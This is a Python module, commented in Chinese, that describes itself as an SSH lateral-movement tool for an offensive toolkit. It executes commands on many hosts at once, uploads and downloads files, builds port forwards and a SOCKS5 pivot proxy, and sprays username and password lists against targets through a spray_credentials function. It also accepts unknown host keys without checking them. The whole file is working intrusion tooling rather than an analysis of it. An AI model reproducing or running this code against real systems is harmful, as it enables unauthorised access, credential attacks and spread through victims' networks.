#!/usr/bin/env python3
"""
SSH 横向移动模块 - SSH Lateral Movement
功能: SSH 命令执行、端口转发、SOCKS 代理、密钥认证
"""

import socket
import os
import time
import threading
import logging
import select
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
import base64

logger = logging.getLogger(__name__)

# 尝试导入 paramiko
try:
    import paramiko
    from paramiko import SSHClient, RSAKey, DSSKey, ECDSAKey, Ed25519Key
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    logger.warning("paramiko not installed, SSH functionality limited")


class SSHAuthMethod(Enum):
    """SSH 认证方式"""
    PASSWORD = "password"
    KEY_FILE = "key_file"
    KEY_STRING = "key_string"
    AGENT = "agent"


@dataclass
class SSHCredentials:
    """SSH 凭据"""
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    key_string: Optional[str] = None
    key_passphrase: Optional[str] = None
    use_agent: bool = False

    @property
    def auth_method(self) -> SSHAuthMethod:
        if self.use_agent:
            return SSHAuthMethod.AGENT
        elif self.key_file:
            return SSHAuthMethod.KEY_FILE
        elif self.key_string:
            return SSHAuthMethod.KEY_STRING
        return SSHAuthMethod.PASSWORD


@dataclass
class SSHExecResult:
    """SSH 执行结果"""
    success: bool
    stdout: str
    stderr: str
    exit_code: int
    duration: float = 0.0


@dataclass
class TunnelConfig:
    """隧道配置"""
    local_port: int
    remote_host: str
    remote_port: int
    bind_address: str = "127.0.0.1"


class SSHConnection:
    """
    SSH 连接封装

    Usage:
        conn = SSHConnection("192.168.1.100")
        creds = SSHCredentials(username="root", password="password")

        if conn.connect(creds):
            result = conn.exec_command("whoami")
            print(result.stdout)
            conn.close()
    """

    def __init__(self, host: str, port: int = 22, timeout: float = 10.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._client: Optional[paramiko.SSHClient] = None
        self._transport = None
        self._connected = False

    def connect(self, creds: SSHCredentials) -> bool:
        """
        建立 SSH 连接

        Args:
            creds: SSH 凭据
        """
        if not HAS_PARAMIKO:
            logger.error("paramiko not installed")
            return False

        try:
            self._client = paramiko.SSHClient()
            self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            connect_kwargs = {
                "hostname": self.host,
                "port": self.port,
                "username": creds.username,
                "timeout": self.timeout,
                "allow_agent": creds.use_agent,
                "look_for_keys": False,
            }

            if creds.auth_method == SSHAuthMethod.PASSWORD:
                connect_kwargs["password"] = creds.password
            elif creds.auth_method == SSHAuthMethod.KEY_FILE:
                key = self._load_key_file(creds.key_file, creds.key_passphrase)
                if key:
                    connect_kwargs["pkey"] = key
                else:
                    connect_kwargs["key_filename"] = creds.key_file
                    if creds.key_passphrase:
                        connect_kwargs["passphrase"] = creds.key_passphrase
            elif creds.auth_method == SSHAuthMethod.KEY_STRING:
                key = self._load_key_string(creds.key_string, creds.key_passphrase)
                if key:
                    connect_kwargs["pkey"] = key

            self._client.connect(**connect_kwargs)
            self._transport = self._client.get_transport()
            self._connected = True

            logger.info(f"SSH connected to {creds.username}@{self.host}")
            return True

        except paramiko.AuthenticationException as e:
            logger.error(f"SSH authentication failed: {e}")
            return False
        except paramiko.SSHException as e:
            logger.error(f"SSH connection failed: {e}")
            return False
        except Exception as e:
            logger.error(f"SSH error: {e}")
            return False

    def _load_key_file(self, key_file: str, passphrase: Optional[str]) -> Optional[paramiko.PKey]:
        """加载密钥文件"""
        key_classes = [RSAKey, DSSKey, ECDSAKey, Ed25519Key]

        for key_class in key_classes:
            try:
                return key_class.from_private_key_file(key_file, password=passphrase)
            except Exception:
                continue

        return None

    def _load_key_string(self, key_string: str, passphrase: Optional[str]) -> Optional[paramiko.PKey]:
        """从字符串加载密钥"""
        import io
        key_file = io.StringIO(key_string)

        key_classes = [RSAKey, DSSKey, ECDSAKey, Ed25519Key]

        for key_class in key_classes:
            try:
                key_file.seek(0)
                return key_class.from_private_key(key_file, password=passphrase)
            except Exception:
                continue

        return None

    def exec_command(self,
                     command: str,
                     timeout: float = 60.0,
                     get_pty: bool = False) -> SSHExecResult:
        """
        执行命令

        Args:
            command: 命令
            timeout: 超时时间
            get_pty: 是否获取 PTY
        """
        if not self._connected or not self._client:
            return SSHExecResult(
                success=False,
                stdout="",
                stderr="Not connected",
                exit_code=-1
            )

        start_time = time.time()

        try:
            stdin, stdout, stderr = self._client.exec_command(
                command,
                timeout=timeout,
                get_pty=get_pty
            )

            exit_code = stdout.channel.recv_exit_status()
            stdout_text = stdout.read().decode('utf-8', errors='ignore')
            stderr_text = stderr.read().decode('utf-8', errors='ignore')

            return SSHExecResult(
                success=exit_code == 0,
                stdout=stdout_text,
                stderr=stderr_text,
                exit_code=exit_code,
                duration=time.time() - start_time
            )

        except Exception as e:
            return SSHExecResult(
                success=False,
                stdout="",
                stderr=str(e),
                exit_code=-1,
                duration=time.time() - start_time
            )

    def exec_command_interactive(self,
                                 command: str,
                                 send_input: Optional[str] = None) -> SSHExecResult:
        """
        交互式命令执行 (用于需要输入的命令)

        Args:
            command: 命令
            send_input: 要发送的输入
        """
        if not self._connected or not self._client:
            return SSHExecResult(
                success=False, stdout="", stderr="Not connected", exit_code=-1
            )

        try:
            channel = self._transport.open_session()
            channel.get_pty()
            channel.exec_command(command)

            if send_input:
                time.sleep(0.5)
                channel.send(send_input + "\n")

            output = ""
            while True:
                if channel.recv_ready():
                    output += channel.recv(4096).decode('utf-8', errors='ignore')
                if channel.exit_status_ready():
                    break
                time.sleep(0.1)

            exit_code = channel.recv_exit_status()
            channel.close()

            return SSHExecResult(
                success=exit_code == 0,
                stdout=output,
                stderr="",
                exit_code=exit_code
            )

        except Exception as e:
            return SSHExecResult(
                success=False, stdout="", stderr=str(e), exit_code=-1
            )

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """上传文件 (SFTP)"""
        if not self._connected or not self._client:
            return False

        try:
            sftp = self._client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            logger.info(f"Uploaded {local_path} to {remote_path}")
            return True
        except Exception as e:
            logger.error(f"Upload failed: {e}")
            return False

    def download_file(self, remote_path: str, local_path: str) -> bool:
        """下载文件 (SFTP)"""
        if not self._connected or not self._client:
            return False

        try:
            sftp = self._client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            logger.info(f"Downloaded {remote_path} to {local_path}")
            return True
        except Exception as e:
            logger.error(f"Download failed: {e}")
            return False

    def create_local_forward(self, config: TunnelConfig) -> Optional[threading.Thread]:
        """
        创建本地端口转发 (SSH -L)

        本地端口 -> SSH Server -> 远程主机
        """
        if not self._transport:
            return None

        def forward_handler():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind((config.bind_address, config.local_port))
                server.listen(5)

                logger.info(f"Local forward: {config.bind_address}:{config.local_port} -> "
                            f"{config.remote_host}:{config.remote_port}")

                while True:
                    client_sock, addr = server.accept()
                    logger.debug(f"Forward connection from {addr}")

                    # 打开到远程的通道
                    channel = self._transport.open_channel(
                        "direct-tcpip",
                        (config.remote_host, config.remote_port),
                        addr
                    )

                    if channel is None:
                        client_sock.close()
                        continue

                    # 双向转发
                    forward_thread = threading.Thread(
                        target=self._forward_data,
                        args=(client_sock, channel)
                    )
                    forward_thread.daemon = True
                    forward_thread.start()

            except Exception as e:
                logger.error(f"Local forward error: {e}")

        thread = threading.Thread(target=forward_handler)
        thread.daemon = True
        thread.start()
        return thread

    def create_remote_forward(self, config: TunnelConfig) -> bool:
        """
        创建远程端口转发 (SSH -R)

        远程端口 -> SSH Server -> 本地主机
        """
        if not self._transport:
            return False

        try:
            self._transport.request_port_forward(
                config.bind_address,
                config.local_port
            )

            logger.info(f"Remote forward: {config.bind_address}:{config.local_port} -> "
                        f"localhost:{config.remote_port}")
            return True

        except Exception as e:
            logger.error(f"Remote forward failed: {e}")
            return False

    def create_socks_proxy(self, bind_address: str = "127.0.0.1",
                           port: int = 1080) -> Optional[threading.Thread]:
        """
        创建 SOCKS5 代理 (SSH -D)
        """
        if not self._transport:
            return None

        def socks_handler():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind((bind_address, port))
                server.listen(5)

                logger.info(f"SOCKS5 proxy started on {bind_address}:{port}")

                while True:
                    client_sock, addr = server.accept()
                    handler_thread = threading.Thread(
                        target=self._handle_socks_client,
                        args=(client_sock,)
                    )
                    handler_thread.daemon = True
                    handler_thread.start()

            except Exception as e:
                logger.error(f"SOCKS proxy error: {e}")

        thread = threading.Thread(target=socks_handler)
        thread.daemon = True
        thread.start()
        return thread

    def _handle_socks_client(self, client_sock: socket.socket):
        """处理 SOCKS5 客户端"""
        try:
            # SOCKS5 握手
            data = client_sock.recv(2)
            if len(data) < 2 or data[0] != 0x05:
                client_sock.close()
                return

            nmethods = data[1]
            methods = client_sock.recv(nmethods)

            # 无认证
            client_sock.send(b'\x05\x00')

            # 获取请求
            data = client_sock.recv(4)
            if len(data) < 4 or data[0] != 0x05 or data[1] != 0x01:
                client_sock.close()
                return

            addr_type = data[3]

            if addr_type == 0x01:  # IPv4
                addr = socket.inet_ntoa(client_sock.recv(4))
            elif addr_type == 0x03:  # Domain
                addr_len = client_sock.recv(1)[0]
                addr = client_sock.recv(addr_len).decode()
            elif addr_type == 0x04:  # IPv6
                addr = socket.inet_ntop(socket.AF_INET6, client_sock.recv(16))
            else:
                client_sock.close()
                return

            port = int.from_bytes(client_sock.recv(2), 'big')

            # 打开 SSH 通道
            channel = self._transport.open_channel(
                "direct-tcpip",
                (addr, port),
                client_sock.getpeername()
            )

            if channel is None:
                client_sock.send(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                client_sock.close()
                return

            # 发送成功响应
            client_sock.send(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')

            # 转发数据
            self._forward_data(client_sock, channel)

        except Exception as e:
            logger.debug(f"SOCKS client error: {e}")
        finally:
            try:
                client_sock.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

    def _forward_data(self, sock: socket.socket, channel):
        """双向数据转发"""
        try:
            while True:
                r, w, x = select.select([sock, channel], [], [], 1.0)

                if sock in r:
                    data = sock.recv(4096)
                    if len(data) == 0:
                        break
                    channel.send(data)

                if channel in r:
                    data = channel.recv(4096)
                    if len(data) == 0:
                        break
                    sock.send(data)

        except Exception as e:
            logger.debug(f"Forward error: {e}")
        finally:
            try:
                channel.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            try:
                sock.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

    def close(self):
        """关闭连接"""
        if self._client:
            try:
                self._client.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        self._connected = False


class SSHLateral:
    """
    SSH 横向移动

    Usage:
        lateral = SSHLateral()

        # 执行命令
        result = lateral.exec_command(
            target="192.168.1.100",
            creds=SSHCredentials(username="root", password="password"),
            command="whoami"
        )

        # 批量执行
        results = lateral.batch_exec(
            targets=["192.168.1.100", "192.168.1.101"],
            creds=creds,
            command="uptime"
        )
    """

    def __init__(self):
        self._connections: Dict[str, SSHConnection] = {}

    def exec_command(self,
                     target: str,
                     creds: SSHCredentials,
                     command: str,
                     port: int = 22) -> SSHExecResult:
        """执行远程命令"""
        conn = SSHConnection(target, port)

        if not conn.connect(creds):
            return SSHExecResult(
                success=False,
                stdout="",
                stderr="Connection failed",
                exit_code=-1
            )

        result = conn.exec_command(command)
        conn.close()

        return result

    def batch_exec(self,
                   targets: List[str],
                   creds: SSHCredentials,
                   command: str,
                   port: int = 22,
                   parallel: bool = True) -> Dict[str, SSHExecResult]:
        """批量执行命令"""
        results = {}

        if parallel:
            threads = []
            lock = threading.Lock()

            def exec_target(target):
                result = self.exec_command(target, creds, command, port)
                with lock:
                    results[target] = result

            for target in targets:
                t = threading.Thread(target=exec_target, args=(target,))
                t.start()
                threads.append(t)

            for t in threads:
                t.join()
        else:
            for target in targets:
                results[target] = self.exec_command(target, creds, command, port)

        return results

    def spray_credentials(self,
                          targets: List[str],
                          usernames: List[str],
                          passwords: List[str],
                          port: int = 22) -> Dict[str, SSHCredentials]:
        """
        SSH 凭据喷洒

        Returns:
            成功的 target -> creds 映射
        """
        success = {}

        for target in targets:
            for username in usernames:
                for password in passwords:
                    creds = SSHCredentials(username=username, password=password)
                    conn = SSHConnection(target, port)

                    if conn.connect(creds):
                        success[target] = creds
                        logger.info(f"Valid SSH creds: {username}:{password}@{target}")
                        conn.close()
                        break

                    conn.close()

                if target in success:
                    break

        return success


# 便捷函数
def ssh_exec(target: str,
             username: str,
             password: str = "",
             key_file: str = "",
             command: str = "whoami",
             port: int = 22) -> Dict[str, Any]:
    """
    SSH 命令执行

    Args:
        target: 目标主机
        username: 用户名
        password: 密码
        key_file: 密钥文件路径
        command: 命令
        port: SSH 端口
    """
    creds = SSHCredentials(
        username=username,
        password=password if password else None,
        key_file=key_file if key_file else None
    )

    conn = SSHConnection(target, port)
    if not conn.connect(creds):
        return {"success": False, "error": "Connection failed"}

    result = conn.exec_command(command)
    conn.close()

    return {
        "success": result.success,
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.exit_code,
        "duration": result.duration,
        "target": target,
        "command": command
    }


def ssh_tunnel(target: str,
               username: str,
               password: str,
               local_port: int,
               remote_host: str,
               remote_port: int,
               port: int = 22) -> Dict[str, Any]:
    """
    创建 SSH 隧道

    Args:
        target: SSH 服务器
        username: 用户名
        password: 密码
        local_port: 本地端口
        remote_host: 远程目标主机
        remote_port: 远程目标端口
        port: SSH 端口
    """
    creds = SSHCredentials(username=username, password=password)
    conn = SSHConnection(target, port)

    if not conn.connect(creds):
        return {"success": False, "error": "Connection failed"}

    config = TunnelConfig(
        local_port=local_port,
        remote_host=remote_host,
        remote_port=remote_port
    )

    thread = conn.create_local_forward(config)

    return {
        "success": thread is not None,
        "local_bind": f"127.0.0.1:{local_port}",
        "remote_target": f"{remote_host}:{remote_port}",
        "ssh_server": target
    }


def ssh_upload(target: str,
               username: str,
               password: str,
               local_path: str,
               remote_path: str,
               port: int = 22) -> Dict[str, Any]:
    """SSH 文件上传"""
    creds = SSHCredentials(username=username, password=password)
    conn = SSHConnection(target, port)

    if not conn.connect(creds):
        return {"success": False, "error": "Connection failed"}

    success = conn.upload_file(local_path, remote_path)
    conn.close()

    return {
        "success": success,
        "target": target,
        "local_path": local_path,
        "remote_path": remote_path
    }


if __name__ == "__main__":
    print("SSH Lateral Movement Module")
    print("=" * 50)
    print(f"paramiko available: {HAS_PARAMIKO}")
    print("\nUsage:")
    print("  from core.lateral import ssh_exec, ssh_tunnel")
    print("  result = ssh_exec('192.168.1.100', 'root', 'password', command='id')")
